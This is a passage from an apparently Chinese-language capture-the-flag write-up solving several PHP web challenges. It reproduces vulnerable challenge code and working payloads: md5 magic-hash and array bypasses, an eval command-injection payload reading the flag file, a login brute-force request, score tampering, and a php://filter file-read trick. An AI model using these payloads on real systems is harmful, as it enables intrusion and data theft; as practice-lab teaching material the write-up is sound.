class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ÊîæÁÇπËµÑÊñôÔºåÂ∞±‰∏çËØ¥‰∫Ü</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$md5 						md5($md5)</span><br><span class="line">s878926199a					0e545993274517709034328855841020</span><br><span class="line">s155964671a					0e342768416822451524974117254469</span><br><span class="line">s214587387a					0e848240448830537924465865611904</span><br><span class="line">s214587387a					0e848240448830537924465865611904</span><br><span class="line">s878926199a					0e545993274517709034328855841020</span><br><span class="line">s1091221200a					0e940624217856561557816327384675</span><br><span class="line">s1885207154a					0e509367213418206700842008763514</span><br><span class="line">s1502113478a					0e861580163291561247404381396064</span><br><span class="line">s1885207154a					0e509367213418206700842008763514</span><br><span class="line">s1836677006a					0e481036490867661113260034900752</span><br><span class="line">s155964671a					0e342768416822451524974117254469</span><br><span class="line">s1184209335a					0e072485820392773389523109082030</span><br><span class="line">s1665632922a					0e731198061491163073197128363787</span><br><span class="line">s1502113478a					0e861580163291561247404381396064</span><br><span class="line">s1836677006a					0e481036490867661113260034900752</span><br><span class="line">s1091221200a					0e940624217856561557816327384675</span><br><span class="line">s155964671a					0e342768416822451524974117254469</span><br><span class="line">s1502113478a					0e861580163291561247404381396064</span><br><span class="line">s155964671a					0e342768416822451524974117254469</span><br><span class="line">s1665632922a					0e731198061491163073197128363787</span><br><span class="line">s155964671a					0e342768416822451524974117254469</span><br><span class="line">s1091221200a					0e940624217856561557816327384675</span><br><span class="line">s1836677006a					0e481036490867661113260034900752</span><br><span class="line">s1885207154a					0e509367213418206700842008763514</span><br><span class="line">s532378020a					0e220463095855511507588041205815</span><br><span class="line">s878926199a					0e545993274517709034328855841020</span><br><span class="line">s1091221200a					0e940624217856561557816327384675</span><br><span class="line">s214587387a					0e848240448830537924465865611904</span><br><span class="line">s1502113478a					0e861580163291561247404381396064</span><br><span class="line">s1091221200a					0e940624217856561557816327384675</span><br><span class="line">s1665632922a					0e731198061491163073197128363787</span><br><span class="line">s1885207154a					0e509367213418206700842008763514</span><br><span class="line">s1836677006a					0e481036490867661113260034900752</span><br><span class="line">s1665632922a					0e731198061491163073197128363787</span><br><span class="line">s878926199a					0e545993274517709034328855841020</span><br><span class="line">QNKCDZO						0e830400451993494058024219903391</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">key3</span>%<span class="number">5</span>B%<span class="number">5</span>D=<span class="number">1</span>&amp;flag5=+</span></span><br></pre></td></tr></table></figure>

<h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>‰æùÊóßÁªèÂÖ∏</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ëøá‰∫Ümd5Â∞±ÂèØ‰ª•RCE</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i)</span><br><span class="line">    h = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h.startswith(<span class="string">&#x27;c4d038&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(s, h)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;&amp;e[v.a.l=echo `tac /f*`;</span><br></pre></td></tr></table></figure>

<h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwords.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pwds = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwords_md5.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> pwds:</span><br><span class="line">        <span class="keyword">import</span> hashlib</span><br><span class="line">        md5val = hashlib.md5(pwd.encode()).hexdigest()</span><br><span class="line">        f.write(md5val+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/signin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=hacker; token=</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475/signin.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml">un=admin&amp;pw=</span><span class="template-variable">&#123;&#123;<span class="name">file:line</span>(<span class="name">D:</span>\Burpsuite\ÂØÜÁ†ÅÂêàÈõÜ\passwords_md5.txt)&#125;&#125;</span><span class="language-xml">&amp;rem=0</span></span></span><br></pre></td></tr></table></figure>

<p>ÁôªÂΩïËøõÂéª‰πãÂêéÊ≤°‰ªÄ‰πàÁî®ÔºåÁàÜÁ†¥Âá∫Êù•ÊòØ<code>admin\000000</code>ÔºåÁôªÂΩïÁöÑÊó∂ÂÄôÊäìÂåÖËé∑Âæó‰∫Üflag</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/passport/9963b7428698fdf50f4c66c7db8ff8e113c5b1e47244da406411476e536259f1.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=hacker; token=</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475/signin.php</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27475</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>89</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">passport=OWY<span class="number">1</span>OW<span class="name">M3</span>fGFkbWlufGIxZWE<span class="number">3</span><span class="name">M3</span>w<span class="number">2</span><span class="symbol">NzBiMTQ3</span>MjhhZDk<span class="number">5</span>MDJhZW<span class="symbol">NiYTMyZTIyZmE0</span>ZjZiZHw<span class="number">5</span>YmY<span class="number">2</span>ZXww</span></span><br></pre></td></tr></table></figure>

<h2 id="Ê∏∏ÊàèÈ´òÊâã"><a href="#Ê∏∏ÊàèÈ´òÊâã" class="headerlink" title="Ê∏∏ÊàèÈ´òÊâã"></a>Ê∏∏ÊàèÈ´òÊâã</h2><p>Áúã‰∫ÜÂâçÁ´ØÁöÑjs‰ª£Á†ÅÊòØÂíåÂêéÁ´ØÁöÑphpËøûÁùÄÁöÑÔºåÂèØ‰ª•Áõ¥Êé•ÊéßÂà∂Âè∞ÁªôÂàÜÊï∞ÁÑ∂ÂêéoverÂ∞±Ë°å‰∫Ü</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gameScore=<span class="number">10000000</span>;<span class="title function_">gameover</span>();</span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊòØ‚Ñ¢ÁöÑÂèëÁé∞Âá∫È¢ò‰∫∫Ê†πÊú¨ÂâçÂêéÁ´ØÊ≤°ÂàÜÁ¶ª</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;score&quot;</span><span class="punctuation">:</span><span class="number">10000000</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>ËøôÊ†∑‰πüÂèØ‰ª•</p>
<h2 id="include-0„ÄÇ0"><a href="#include-0„ÄÇ0" class="headerlink" title="include 0„ÄÇ0"></a>include 0„ÄÇ0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Áõ¥Êé•Áî®iconvÂ∞±Ë°å‰∫Ü</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><code>convert.iconv.*</code>ÁöÑ‰ΩøÁî®ÊñπÂºèÊúâ‰∏§Áßç</p>
<ul>
<li>‰∏ÄÁßçÊòØÁî®<code>.</code></li>
<li>‰∏ÄÁßçÊòØÁî®<code>/</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>

<p>ËøôÈ¢òÈáåÈù¢ÁöÑÂ∞±ÊòØÊääÊñá‰ª∂ÁöÑÂ≠óÁ¨¶ÁºñÁ†Å‰ªé<code>UTF-8</code>ËΩ¨Êç¢Êàê<code>UTF-16</code>ÔºåÊîØÊåÅÁöÑÂ≠óÁ¨¶ÁºñÁ†ÅÊúâ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line">EUC-JP*</span><br><span class="line">SJIS*</span><br><span class="line">eucJP-win*</span><br><span class="line">SJIS-win*</span><br><span class="line">ISO-2022-JP</span><br><span class="line">ISO-2022-JP-MS</span><br><span class="line">CP932</span><br><span class="line">CP51932</span><br><span class="line">SJIS-mac (alias: MacJapanese)</span><br><span class="line">SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)</span><br><span class="line">SJIS-Mobile#KDDI (alias: SJIS-KDDI)</span><br><span class="line">SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)</span><br><span class="line">UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)</span><br><span class="line">UTF-8-Mobile#KDDI-A</span><br><span class="line">UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)</span><br><span class="line">UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)</span><br><span 